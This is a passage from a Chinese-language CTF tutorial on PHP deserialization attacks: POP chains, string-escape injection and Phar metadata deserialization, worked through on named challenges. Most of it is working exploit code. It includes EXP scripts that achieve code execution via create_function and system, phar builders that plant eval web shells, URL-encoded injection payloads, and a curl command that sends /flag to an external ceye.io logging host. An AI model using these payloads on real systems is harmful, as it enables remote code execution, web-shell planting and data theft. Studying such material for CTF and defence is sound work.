- 寻找可以调用 `Show` 类中的 `__toString()` 方法的类：由于 `__toString()` 方法为魔术方法，当当前类 (Show) 被当做字符串输出时调用。在 `Show` 类中我们发现存在 `__get()` 方法，该方法为魔术方法，当访问一个不存在或无法访问的属性时自动调用。其方法存在 `$function = $this->$key;$this->{$key}();` 其中的 `$key` 为不可访问或不存在的属性，假设不可访问的属性为 `__toString`，那么带入到 `$this->{$key}()` 拼接之后就成为了 `$this->__toString()` 即可达到调用 `__toString()` 方法的效果。

在类外部我们可以发现，存在如下代码:

```
php
if (isset($_GET['sid'])) {
    $sid = $_GET['sid']; // __toString
    $config = unserialize($_GET['config']); // Show 对象的序列化值
    $config->$sid; // $config->__toString 
}
```

`Show` 类中并没有 `__toString` 属性，那么就会触发 `__get($key)`，其中 `$key` 的值就为无法访问的属性 `__toString`, 带入到 `$this->{$key}()` 中就为: `$this->__toString()` 最终调用了该方法。

**构造 EXP**:

```
php

<?php 
class Read {
}

class Show {
    public $source;
    public $var;
    public $class1;
}

$obj = new Read;
$obj2 = new Show;
$obj2->class1 = $obj;
$obj2->var = 'flag.php';
echo urlencode(serialize($obj2));
?>
```

利用:

[![alt text](https://image.3001.net/images/20240325/1711368560_660169703a4304c3ef166.png)](https://image.3001.net/images/20240325/1711368560_660169703a4304c3ef166.png)

##### 题解

当然这里除了传入 `sid` 参数直接调用 `Show` 类下的 `__toString` 以外，还可以调用 `Show` 类下的 `_show()` 和 `Change()`，因为这俩方法都存在 `preg_match()` 正则函数，代码如下: `preg_match("/.../", $this->source)`，正则函数将 `source` 属性作为字符串在表达式中进行匹配，而此时如果 `source` 属性的值为 `Show` 类生成的对象。那么就会调用 `__toString` 方法。

**构造 EXP:**

```
php

<?php 
class Read {
}

class Show {
    public $source;
    public $var;
    public $class1;
}

$obj = new Read;
$obj2 = new Show;
$obj2->class1 = $obj;
$obj2->var = 'flag.php';
$obj2->source = $obj2;
echo urlencode(serialize($obj2));
?>
```

利用:

[![alt text](https://image.3001.net/images/20240325/1711368565_66016975061939cd9dd95.png)](https://image.3001.net/images/20240325/1711368565_66016975061939cd9dd95.png)

[![alt text](https://image.3001.net/images/20240325/1711368567_660169772f9f9200e5786.png)](https://image.3001.net/images/20240325/1711368567_660169772f9f9200e5786.png)

至于为什么调用了 `_show` 方法之后执行了两次 `__toString()`，而 `Change` 执行了一次 `__toString()` 原因如下:

[![alt text](https://image.3001.net/images/20240325/1711368570_6601697a677f1255915d7.png)](https://image.3001.net/images/20240325/1711368570_6601697a677f1255915d7.png)

#### 例题 - 3

```
php

<?php
error_reporting(0);
highlight_file(__FILE__);
class Vox{
    protected $headset;
    public $sound;
    public function fun($pulse){
        include($pulse);
    }
    public function __invoke(){
        $this->fun($this->headset);
    }
}

class Saw{
    public $fearless;
    public $gun;

    public function __toString(){
        $this->gun['gun']->fearless;
        return "Saw";
    }

    public function _pain(){
        if($this->fearless){
            highlight_file($this->fearless);
        }
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|php|\.\./i", $this->fearless)){
            echo "Does it hurt? That's right";
            $this->fearless = "index.php";
        }
    }
}

class Petal{
    public $seed;

    public function __get($sun){
        $Nourishment = $this->seed;
        return $Nourishment();
    }
}

if(isset($_GET['ozo'])){
    unserialize($_GET['ozo']);
}
else{
    $Saw = new Saw('index.php');
    $Saw->_pain();
}
?>
```

**分析:**

- 首先找到在 `Vox` 类中存在危险函数 `include` ，而 该函数在 `fun` 方法内，因此需要 `func` 方法调用并传参可控。
- 寻找可以调用 `func` 方法的类：在其同类下发现 `__invoke()` 方法，存在 `$this->fun($this->headset);`，那么我们只需要将 `Vox` 类的属性 `headset` 赋值为 `php://filter` 伪协议即可读取 `flag.php` 文件内容。
- 寻找可以调用 `Vox` 类中的 `__invoke()` 方法：由于该方法是魔术方法，当当前类被当做函数调用时自动触发，在 `Petal` 中存在 `__get` 方法，代码为: `$Nourishment = $this->seed;return $Nourishment();` 也就是说，我们将属性 `seed` 赋值为 `Vox` 对象，即可调用 `Vox` 类的 `__invoke()`。
- 寻找可以调用 `Petal` 类的 `__get()` 方法: `__get` 是魔术方法，当访问一个不存在或无法访问的属性时，自动触发。在 `Saw` 类中的 `__toString` 方法存在 `$this->gun['gun']->fearless;return "Saw";`，那么我们只需要让属性 `gun` 赋值为一个关联数组，其中键名 `gun` 的值为 `Petal` 对象即可。
- 寻找可以调用 `Saw` 类的 `__toString` 方法：在本类中 `__wakeup` 存在 `preg_match` 正则匹配函数，对 `source` 属性进行校验，因此，我们只需要将 `source` 属性赋值为 `Saw` 对象即可触发 `__toString`，而 `__wakeup` 在反序列化的时候自动调用。
  **构造 EXP:**

```
php

<?php
class Vox{
    protected $headset = "php://filter/read=convert.base64-encode/resource=flag.php";
    public $sound;
}

class Saw{
    public $fearless;
    public $gun;
}

class Petal{
    public $seed;
}
$obj = new Vox;
$obj2 = new Petal;
$obj2->seed = $obj;
$obj3 = new Saw();
$obj3->gun = array('gun' => $obj2);
$obj3->fearless = $obj3;

echo urlencode(serialize($obj3));
?>
```

#### 例题 - 4

选自第二届赣网杯 web2 **PHP7** 环境

```
php

<?php
error_reporting(0);
highlight_file(__FILE__);
$pwd=getcwd();
class func
{
        public $mod1;
        public $mod2;
         public $key;
        public function __destruct()
        {        
                unserialize($this->key)();
                $this->mod2 = "welcome ".$this->mod1;
                  
        } 
}

class GetFlag
{        public $code;
         public $action;
        public function get_flag(){
            $a=$this->action;
            $a('', $this->code);
        }
}

unserialize($_GET[0]);
?>
```

##### 数组特性

当一个数组中存在两个元素，第一个元素则是 `实例化某个类`，第二个元素是个该类的方法名字符串。那么当我们执行 `$arr();` 调用该数组的时候，则会调用该方法 (第二个函数名字符串)。

适用于 PHP5、PHP7

```
php
<?php 
class Demo {
	public function info() {
		echo "我是 Demo 类 的 info 函数";
	}
}
$arr = [new Demo, 'info'];
$arr();
?>
```

[![alt text](https://image.3001.net/images/20240325/1711368578_6601698250d8405a0bd17.png)](https://image.3001.net/images/20240325/1711368578_6601698250d8405a0bd17.png)

**分析:**

- 了解数组的特性之后，在 `func` 类中的析构方法中存在 `unserialize($this->key)();`，我们只需要将 key 属性赋值为数组 `array(new GetFlag, 'get_flag')` 并将其进行序列化即可调用 `GetFlag` 类 `get_flag` 方法。
- 在 `Get_flag` 类下的 `get_flag` 方法中发现存在 `$a=$this->action;$a('', $this->code);` 其实这里我们可以使用 `create_function`。即可实现任意代码执行。

**构造 EXP**:

```
php

<?php
class func {
        public $mod1;
        public $mod2;
        public $key;
}

class GetFlag { 
        public $code = '}system($_GET[1]);echo 123;//';
        public $action = "create_function";
}

$f = new func;
$gf = new GetFlag;
$f->key = serialize([$gf, 'get_flag']);
echo serialize($f);
?>
```

利用:

[![alt text](https://image.3001.net/images/20240325/1711368582_660169869038f1e028c2d.png)](https://image.3001.net/images/20240325/1711368582_660169869038f1e028c2d.png)

### 字符逃逸

#### 字符逃逸的本质

**字符逃逸本质**: 对序列化字符串进行**不等长的字符串替换**，导致本来属于普通字符串的一部分字符串变成了序列化的一部分，或者导致本来不属于字符串的一部分变成了字符串的一部分，进而造成了序列化数据的错乱，导致了对象注入。

#### 解题思路

- 写出基本的序列化（传参入口的）
- 写出注入对象的序列化 （POP 链构造）
- 分析是长到短还是短到长的替换
- 算清楚替换的差值，计算需要吃掉或挤出 (逃逸) 的字符串的长度，保证这个长度是替换的差值的整数倍，如果不能保证，则加字符串使其成为整数倍。
- 构造替换，对象注入

#### 例题 - 1 长到短

选自: DASCTF Esunserialize

```
php

<?php
show_source("index.php");
function write($data) {
    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
}

function read($data) {
    return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
}

class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this->username = $a;
        $this->password = $b;
    }
}

class B{
    public $b = 'gqy';
    function __destruct(){
        $c = 'a'.$this->b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this->c);
        return 'nice';
    }
}

$a = new A($_GET['a'],$_GET['b']);
$b = unserialize(read(write(serialize($a))));
?>
```

**题目分析**:

- 反序列的控制点在 A 类的两个属性中，而并不是直接的 `unserialize()` 参数可控。
- 通过传入参数 a 和 b 分别赋值给 A 类的 username 和 password 属性之后进行序列化，分别经过 `write()` 和 `read()` 函数之后再进行反序列化。
- `wirte(): `其主要作用是将不可见字符 `0`，不可见字符这里以 0 表示，将 `0*0` 替换为 `\0\0\0`
- `read(): `其主要作用是将 `\0\0\0` 替换为不可见字符 `0`, 不可见字符 以 `0` 表示，替换为 `0*0`
- 这里由于对 `\0\0\0` 使用的是单引号，故而不进行转义，那么就导致可能从 6 位长度的字符替换为 3 位长度的字符。不等长的替换，可能就存在字符逃逸，而这里由于是从 6 位到 3 位，因此这里是由长到短的替换。
- 最后我们构造 POP 链即可，将注入对象作为 `username` 或 `password` 属性的值即可。

**解题思路:**

1. 序列化入口类:

```
php
<?php 
class A{
    public $username = "UA";
    public $password = "PW";
    // function __construct($a, $b){
    //     $this->username = $a;
    //     $this->password = $b;
    // }
}

echo serialize(new A);
// O:1:"A":2:{s:8:"username";s:2:"UA";s:8:"password";s:2:"PW";}
?>
```

1. 构造 POP 链 序列化注入对象:

```
php

<?php 
class B{
    public $b = 'gqy';
    // function __destruct(){
    //     $c = 'a'.$this->b;
    //     echo $c;
    // }
}

class C{
    public $c;
    // function __toString(){
    //     //flag.php
    //     echo file_get_contents($this->c);
    //     return 'nice';
    // }
}

$obj1 = new B;
$obj2 = new C;
$obj1->b = $obj2;
$obj2->c = 'flag.php';
echo serialize($obj1);
// O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}
?>
```

1. 将 A 对象的 `username` 或 `password` 属性赋值为反序列化 B 类

[![alt text](https://image.3001.net/images/20240325/1711368591_6601698f28c6feb5dba5e.png)](https://image.3001.net/images/20240325/1711368591_6601698f28c6feb5dba5e.png)

其中标注红的则是注入对象的值，但是由于是字符串传入，因此会把该序列化值当作普通字符串，很明显是利用不成功的。

但是有了不等长替换从 6 位 替换为 3 位 之后，那么我们就可以将一些没用的东西吃掉。

例如：

我们在 username 处传入 `\0\0\0` 当经过 `read()` 函数之后则会变成：

[![alt text](https://image.3001.net/images/20240325/1711368596_66016994051db46a73390.png)](https://image.3001.net/images/20240325/1711368596_66016994051db46a73390.png)

经过 `read()` 长到短之后，就带入到 `unserialize()` 函数进行反序列化，由于原本值长度为 6 位，但是替换之后实际长度变成了 3 位，那么 PHP 则会向后再取 3 位。最终由于语法格式不对，导致反序列化错误。

那么我们如果巧妙的刚好把它替换为一个合法的序列化字符串呢？是不是就达到了利用效果呢？

首先我们先计算要吃掉的字符串长度:

[![alt text](https://image.3001.net/images/20240325/1711368600_6601699881eb4e23f2d80.png)](https://image.3001.net/images/20240325/1711368600_6601699881eb4e23f2d80.png)

由于序列化字符串的格式都是 `属性;值;属性;值`，而我们将其吃掉之后，就变成了 `属性;值;值;`, 不符合要求，故而我们添加一个属性名，假设为 `password`:

[![alt text](https://image.3001.net/images/20240325/1711368605_6601699dc17938d1f18c6.png)](https://image.3001.net/images/20240325/1711368605_6601699dc17938d1f18c6.png)

但是上图中红色文字末尾的需要进行闭合，我们添加闭合内容：

[![alt text](https://image.3001.net/images/20240325/1711368608_660169a0a95ff40eb0766.png)](https://image.3001.net/images/20240325/1711368608_660169a0a95ff40eb0766.png)

接下来就符合要求了，那么 `$_GET[b]` 传入的值就为:

[![alt text](https://image.3001.net/images/20240325/1711368612_660169a46fb85f0591588.png)](https://image.3001.net/images/20240325/1711368612_660169a46fb85f0591588.png)

最后我们只需要计算需要多个对 `\0\0\0` 替换即可，前面计算出来我们需要吃掉 22 个字符。

[![alt text](https://image.3001.net/images/20240325/1711368616_660169a8ba141228e2db2.png)](https://image.3001.net/images/20240325/1711368616_660169a8ba141228e2db2.png)

而每对 6 位字符 `\0\0\0` 替换为 `3个字符`，也就是 `22 / 3 `是除不尽的。

[![alt text](https://image.3001.net/images/20240325/1711368620_660169aca9e833cd74fbc.png)](https://image.3001.net/images/20240325/1711368620_660169aca9e833cd74fbc.png)

那么该怎么办呢？其实很简单，在 `password` 前面加入两个字符，让吃掉的字符变为 **24** 即可，让其除的进，**这里特别注意，不能在 `username` 处加入，因为这会影响值的长度**。

于是 password ，也就是 `$_GET[b]` 的值为:

[![alt text](https://image.3001.net/images/20240325/1711368624_660169b09986523f05cb2.png)](https://image.3001.net/images/20240325/1711368624_660169b09986523f05cb2.png)

最终 22 / 3 得 8，于是 `username` 处只需要 8 对 `\0\0\0` 即可。

```
php
?a=UA\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&b=x";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}s:0:"";s:0:"
```

[![alt text](https://image.3001.net/images/20240325/1711368629_660169b5a0d6b457e40eb.png)](https://image.3001.net/images/20240325/1711368629_660169b5a0d6b457e40eb.png)

#### 例题 - 2 短到长

```
php

<?php
show_source("index.php");
function write($data) {
    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
}

function read($data) {
    return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
}

class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this->username = $a;
        $this->password = $b;
    }
}

class B{
    public $b = 'gqy';
    function __destruct(){
        $c = 'a'.$this->b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this->c);
        return 'nice';
    }
}

$a = new A($_GET['a'],$_GET['b']);
$b = unserialize(write(read(serialize($a))));
?>
```

**题目分析:**
请参照长到短的替换题目分析，这里只不过是将 `0*0` 3 位字符 (其中 0 为不可见字符)，变成了 `\0\0\0` 6 位字符。

解题思路:

1. 序列化入口类
   与长到短一致，这里只放截图:

[![alt text](https://image.3001.net/images/20240325/1711368635_660169bbb47c47117628b.png)](https://image.3001.net/images/20240325/1711368635_660169bbb47c47117628b.png)

1. 构造 POP 链 序列化注入对象
   与长到短一致，这里只放截图:

[![alt text](https://image.3001.net/images/20240325/1711368640_660169c0db1d25fbd2a22.png)](https://image.3001.net/images/20240325/1711368640_660169c0db1d25fbd2a22.png)

1. 将 A 对象的 `username` 或 `password` 属性赋值为反序列化 B 类

[![alt text](https://image.3001.net/images/20240325/1711368644_660169c40386689979124.png)](https://image.3001.net/images/20240325/1711368644_660169c40386689979124.png)

1. 构造闭合
   由于不符合序列化字符串的规范，故而我们需要构造闭合:

[![alt text](https://image.3001.net/images/20240325/1711368649_660169c996da8278380f4.png)](https://image.3001.net/images/20240325/1711368649_660169c996da8278380f4.png)

1. 计算要挤出的长度

[![alt text](https://image.3001.net/images/20240325/1711368653_660169cd8b653a4b93ac2.png)](https://image.3001.net/images/20240325/1711368653_660169cd8b653a4b93ac2.png)

由于 `write` 函数每替换一次，都会增加 3 个字节，所以逃逸数据必须是 3 的倍数，上面挤出的长度为 78，是 3 的倍数，可以不用动，如果不是 3 的倍数，则可以修改 `属性名` 的方法，使其成为 3 的倍数，例如下图尖头所指位置:

[![alt text](https://image.3001.net/images/20240325/1711368661_660169d530525660d7ade.png)](https://image.3001.net/images/20240325/1711368661_660169d530525660d7ade.png)

[![alt text](https://image.3001.net/images/20240325/1711368656_660169d0c31323dc11d24.png)](https://image.3001.net/images/20240325/1711368656_660169d0c31323dc11d24.png)

最后只需要 26 对 `0*0`（0 为不可见字符）即可，本地测试代码:

```
php

<?php
function write($data) {
    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
}

class A{
    public $username;
    public $password;
}

$a = new A;
// $b = unserialize(write(read(serialize($a))));
$a->username = urldecode('%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00";s:2:"xx";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}s:0:"";s:0:"');
$a->password = 'x1ong';
echo write(serialize($a));
?>
```

运行结果如下：

[![alt text](https://image.3001.net/images/20240325/1711368666_660169da7e00b89921993.png)](https://image.3001.net/images/20240325/1711368666_660169da7e00b89921993.png)

此时 `xx` 属性就被挤出来了，其值为 `B` 类生成的对象。

利用:

```
php
?a=%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%22;s:2:%22xx%22;O:1:%22B%22:1:{s:1:%22b%22;O:1:%22C%22:1:{s:1:%22c%22;s:8:%22flag.php%22;}}s:0:%22%22;s:0:%22&b=x1ong
```

[![alt text](https://image.3001.net/images/20240325/1711368671_660169df441e115d563ea.png)](https://image.3001.net/images/20240325/1711368671_660169df441e115d563ea.png)

### Phar

当我们在做反序列化的题目时，如果没有 `unserialize()` 函数，或者该函数的参数我们不可控时，我们又该何去何从呢？

#### Phar 是什么

`Phar` 归档最好的特点是可以方便将多个文件组成一个文件，因此 `phar` 归档提供了一种方法，可以将完整的 PHP 应用程序分发到单个文件中，并从该文件运行它，它不需要将其提取到磁盘，此外，PHP 可以像执行任何其他文件一样轻松地执行 `Phar` 归档，无论是在命令行上还是在 Web 服务器上。

#### 在上传包含中的利用

可以上传图片，但不能上传 php，可以包含但是只能 `include($userinput . ".php")`。

利用方法：压缩一个 shell.php 到 1.zip 文件中，重命名为 1.png 上传包含: `zip://upload/1.png#shell` 或 `phar://upload/1.png/shell`。

由于 使用 `zip://` 伪协议，大多数需要自行安装 PHP 扩展，有些环境可能没有安装该扩展，导致该协议无法使用，那么 `phar://` 协议则是一个很好的替代， PHP 自带该扩展。

#### Phar 文件格式

[![alt text](https://image.3001.net/images/20240325/1711368676_660169e43639939a3db9a.png)](https://image.3001.net/images/20240325/1711368676_660169e43639939a3db9a.png)

可以从 `Phar` 文件格式中看到，其中用户自定义的 `Meta-data` 会以序列化的形式存储，那么使用 `Phar` 文件的时候一定会进行反序列化，至此在没有 `unserialize()` 函数的时候，同样达到了 `unserialize()` 函数的效果。

#### Phar 反序列化条件

- 需要**有可用的类**，类下**有魔术方法**，最后 **POP Chain 调用到危险方法**
- 由于 `phar://` 协议是文件流协议，故而需要使用**文件操作相关的函数**去使用（触发）该协议。
- 有**上传或者写文件**的操作，可以把**无损的 `phar` 文件上传或写入到 web 服务器**的相关目录，**后缀名任意**。

#### 本地构造 Phar 的条件

需要修改 `php.ini` 配置文件，将 `phar.readonly = On` 设置为 `phar.readonly = Off` 即关闭。

[![alt text](https://image.3001.net/images/20240325/1711368680_660169e8edeef177d25ce.png)](https://image.3001.net/images/20240325/1711368680_660169e8edeef177d25ce.png)

#### 构造 Phar 反序列化

- 把 `class` 类中的代码复制下来，把方法进行注释。
- 构造 `POP` 链
- 使用如下代码构造 `Phar` 文件。

```
php
<?php
$phar = new Phar("phar.phar");
$phar->startBuffering(); // 签名自动计算
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); // 设置stub，增加gif文件头
$phar->setMetadata($o); // 将自定义meta-data写入manifest 
$phar->addFromString("test.txt", "test"); // 添加要压缩的文件
$phar->stopBuffering(); 
?>
```

#### 触发 Phar 的函数

知道创宇测试后可以使用 `phar://` 协议的列表:

[![alt text](https://image.3001.net/images/20240325/1711368685_660169ed838459feded14.png)](https://image.3001.net/images/20240325/1711368685_660169ed838459feded14.png)

但实际不止这些，更多可参考: https://blog.zsxsoft.com/post/38

#### 例题 - 1

选自 [NewStarCTF 2023 公开赛道] PharOne BUUCTF 可开环境

打开环境映入眼帘的是文件上传页面。右键查看页面源代码发现 `class.php`:

[![alt text](https://image.3001.net/images/20240325/1711368689_660169f18d1d33311e96f.png)](https://image.3001.net/images/20240325/1711368689_660169f18d1d33311e96f.png)

访问该文件，获得如下源码:

```
php
<?php
highlight_file(__FILE__);
class Flag{
    public $cmd;
    public function __destruct()
    {
        @exec($this->cmd);
    }
}
@unlink($_POST['file']);
```

是一个很简单的反序列化题目，但是我们没有 `unserialize()` 函数我们如何进行反序列化呢？答案就是上传一个 `phar` 文件。使用 `unlink` 函数触发 `phar://` 协议即可。

**构造序列化:**

```
php

<?php
class Flag{
    public $cmd;
}
$o = new Flag;
$o->cmd = 'echo PD9waHAgZWNobyAxMjM7ZXZhbCgkX0dFVFswXSk7Pz4= | base64 -d > upload/x1ong.php';

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); // 设置stub，增加gif文件头
$phar->setMetadata($o); // 将自定义meta-data写入manifest 
$phar->addFromString("test.txt", "test"); // 添加要压缩的文件
$phar->stopBuffering();
?>
```

将生成的 `phar.phar` 修改为后缀 `phar.png` 上传，但是题目告诉我们不能有 `__HALT_COMPILER` 需要进行绕过。

[![alt text](https://image.3001.net/images/20240325/1711368693_660169f5d987984580d75.png)](https://image.3001.net/images/20240325/1711368693_660169f5d987984580d75.png)

而绕过方法就是对其该文件进行 gzip 压缩上传即可。

[![alt text](https://image.3001.net/images/20240325/1711368696_660169f89ae1de54ccac7.png)](https://image.3001.net/images/20240325/1711368696_660169f89ae1de54ccac7.png)

可以看到压缩过后的文件内容并没有匹配信息。而是压缩包文件，而 phar 协议无需解压就认识 gzip 格式的文件。

但是很遗憾，由于种种原因，最终都没有写入成功木马 ()，经过反复测试发现容器可以上网但是不存在 `ping` 命令，存在 `curl` 命令，于是我们就可以使用数据外带。

**重新构造序列化:**

```
php

<?php
class Flag{
    public $cmd;
}
$o = new Flag;
$o->cmd = 'curl http://******.ceye.io/`cat /flag |base64`';

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); // 设置stub，增加gif文件头
$phar->setMetadata($o); // 将自定义meta-data写入manifest 
$phar->addFromString("test.txt", "test"); // 添加要压缩的文件
$phar->stopBuffering();
?>
```

其中的域名替换成自己 ceye 平台的域名即可，重复上述操作，将 `phar.phar` 文件进行 gzip 压缩之后，将后缀名修改为 `.png` 然后上传到服务器。

[![alt text](https://image.3001.net/images/20240325/1711368700_660169fc913020a4840fe.png)](https://image.3001.net/images/20240325/1711368700_660169fc913020a4840fe.png)

接着访问 `class.php` 文件利用传入 `file` 参数利用即可:

[![alt text](https://image.3001.net/images/20240325/1711368705_66016a0110caf3dfa5035.png)](https://image.3001.net/images/20240325/1711368705_66016a0110caf3dfa5035.png)

来到 `ceye` 平台查看 HTTP 记录，将其中的 base64 解码即可得到 FLAG。

[![alt text](https://image.3001.net/images/20240325/1711368716_66016a0c936da2e8ee213.png)](https://image.3001.net/images/20240325/1711368716_66016a0c936da2e8ee213.png)

[![alt text](https://image.3001.net/images/20240325/1711368713_66016a09106907b1b71bf.png)](https://image.3001.net/images/20240325/1711368713_66016a09106907b1b71bf.png)

之后看了网上的其他 WP 发现可以写马，只不过需要指定绝对路径，例如 `echo '<?php system($_GET[0]);?> > /var/www/html/1.php'`。

#### 例题 - 2

选自 [DASCTF 2020 圣诞赛] WEB-easyphp

题目源码:

```
php

<?php
error_reporting(E_ALL);
$sandbox = '/var/www/html/uploads/' . md5($_SERVER['REMOTE_ADDR']);
if(!is_dir($sandbox)) {
    mkdir($sandbox);
}

include_once('template.php');

$template = array('tp1'=>'tp1.tpl','tp2'=>'tp2.tpl','tp3'=>'tp3.tpl');

if(isset($_GET['var']) && is_array($_GET['var'])) {
    extract($_GET['var'], EXTR_OVERWRITE);
} else {
    highlight_file(__file__);
    die();
}

if(isset($_GET['tp'])) {
    $tp = $_GET['tp'];
    if (array_key_exists($tp, $template) === FALSE) {
        echo "No! You only have 3 template to reader";
        die();
    }
    $content = file_get_contents($template[$tp]);
    $temp = new Template($content);
} else {
    echo "Please choice one template to reader";
}
?>
```

通过源码分析发现题目考点是 `变量覆盖`，可以通过该漏洞实现任意文件读取。其 PAYLOAD 为:

```
php
?var[template][tp1]=/etc/passwd&tp=tp1
```

具体参加文章: [https://www.qwesec.com/2024/02/variables-overriding.html#%E4%BE%8B%E9%A2%98-3](https://www.qwesec.com/2024/02/variables-overriding.html#例题-3)

虽可以进行任意文件读取，但是由于 `flag` 文件不是常规的文件名称，故而不知道文件名无法进行读取。那么我们只能读取模版类 `template.php`。

```
php
?var[template][tp1]=template.php&tp=tp1
```

获取源码如下:

```
php

<?php
class Template{
  public $content;
  public $pattern;
  public $suffix;

  public function __construct($content){
    $this->content = $content;
    $this->pattern = "/{{([a-z]+)}}/"; // 匹配
    $this->suffix = ".html";
  }

  public function __destruct() {
    $this->render();
  }
  public function render() {
    while (True) {
      if(preg_match($this->pattern, $this->content, $matches)!==1) 
        break;
      global ${$matches[1]};
      
      if(isset(${$matches[1]})) {
        $this->content = preg_replace($this->pattern, ${$matches[1]}, $this->content);
      } 
      else{
        break;
      }
    }
    if(strlen($this->suffix)>5) {
      echo "error suffix";
      die();
    }
    $filename = '/var/www/html/uploads/' . md5($_SERVER['REMOTE_ADDR']) . "/" . md5($this->content) . $this->suffix;
    file_put_contents($filename, $this->content);
    echo "Your html file is in " . $filename;
  }
}
?>
```

通过审计代码发现存在 `Template` 类、魔术方法 `__destruct()` 调用了危险方法 `render()`，在该方法内将类的属性 `content`、`suffix` 带入到了 `file_put_contents` 函数中。

那么我们如果使用反序列化，将 `content` 和 `suffix` 赋值为一句话木马和 php 后缀的文件。是不是就可以利用了呢？

但是很遗憾，由于并没有 `unserialize()` 函数，也就是说无法进行反序列化，那么真是如此吗？答案不是，我们注意到，在 `index.php` 文件中存在 `file_get_contents()` 函数，参数我们完全可控。并没有进行任何的过滤。

那么我们是不是可以将生成的 `phar` 文件 通过模版渲染写入到 web 服务器的 `uploads` 目录下。

然后通过 `file_get_contents() `函数触发 `phar://`，从而进行反序列化调用魔术方法 `__destruct` 进行任意文件写入。

**构造序列化:**

```
php
<?php 
class Template{
  public $content;
  public $pattern;
  public $suffix;
}
$o = new Template;
$o->content = '<?php echo 123;@eval($_POST[0]);?>';
$o->suffix = ".php";
?>
```

**生成 phar 文件:**

```
php

<?php 
class Template{
  public $content;
  public $pattern;
  public $suffix;
}
$o = new Template;
$o->content = '<?php echo 123;@eval($_POST[0]);?>';
$o->suffix = ".php";

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); // 设置stub，增加gif文件头
$phar->setMetadata($o); // 将自定义meta-data写入manifest 
$phar->addFromString("test.txt", "test"); // 添加要压缩的文件
$phar->stopBuffering();
?>
```

那么问题来了，我们如何将生成的 `phar.phar` 文件上传到服务器呢？两种方法。

1. 将 `phar.phar` 文件放入到公网服务器，使用 `file_get_contents()` 发起 HTTP 请求获取。但是要求是靶机出网。
2. 对 `phar.phar` 文件的内容进行 base64 编码，让 `file_get_contents()` 函数从 data 伪协议中获取。但是要求 PHP 相关配置开启。

我们就使用第二种方法，首先读取生成的 `phar.phar` 文件，并进行 `base64` 编码：

[![alt text](https://image.3001.net/images/20240325/1711368726_66016a165540075aa0a1e.png)](https://image.3001.net/images/20240325/1711368726_66016a165540075aa0a1e.png)

通过变量覆盖漏洞将该文件写入即可:

```
php
?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%2bDQqpAAAAAQAAABEAAAABAAAAAABzAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjM0OiI8P3BocCBlY2hvIDEyMztAZXZhbCgkX1BPU1RbMF0pOz8%2bIjtzOjc6InBhdHRlcm4iO047czo2OiJzdWZmaXgiO3M6NDoiLnBocCI7fQgAAAB0ZXN0LnR4dAQAAABXjPplBAAAAAx%2bf9i2AQAAAAAAAHRlc3Su6chtb1iLQjdSQ1VrEjks35n0SQIAAABHQk1C&tp=tp1
```

**需要注意的是**: 由于 Base64 编码中可能存在 `+`，我们通过 GET 请求传入时，需要进行 URL 编码。

[![alt text](https://image.3001.net/images/20240325/1711368730_66016a1aebdcdcc02d3a0.png)](https://image.3001.net/images/20240325/1711368730_66016a1aebdcdcc02d3a0.png)

访问生成的模版文件，即可看到 phar 文件的内容:

[![alt text](https://image.3001.net/images/20240325/1711368735_66016a1f20f927f949e79.png)](https://image.3001.net/images/20240325/1711368735_66016a1f20f927f949e79.png)

现在服务器上有了 `Phar` 文件，那么我们该如何使用 `phar://` 触发反序列化呢？

答案是使用 `index.php` 文件中的 `file_get_contents`:

```
bash
?var[template][tp1]=phar://uploads/cb8a7229e230ef0d397727e74a2ee8ae/e9fa73ba88cd4fe4c7777de19b5daa83.html&tp=tp1
```

[![alt text](https://image.3001.net/images/20240325/1711368739_66016a2373450df4368dc.png)](https://image.3001.net/images/20240325/1711368739_66016a2373450df4368dc.png)

由于我们使用 `phar://` 协议，phar 协议在解析 phar 文件的时候，由于元数组是 `Template` 类的序列化字符串，故而进行反序列化，反序列化之后由于 `Template` 类存在析构方法故而进行调用，同时也调用了 `render` 方法进行文件的写入。

最后访问生成的 php 文件即可，利用即可:

[![alt text](https://image.3001.net/images/20240325/1711368747_66016a2b320d955dfc35d.png)](https://image.3001.net/images/20240325/1711368747_66016a2b320d955dfc35d.png)

### 指针引用

#### 例题 - 1

选择 BUUCTF 平台: BUU CODE REVIEW 1

```
php

<?php
highlight_file(__FILE__);
class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
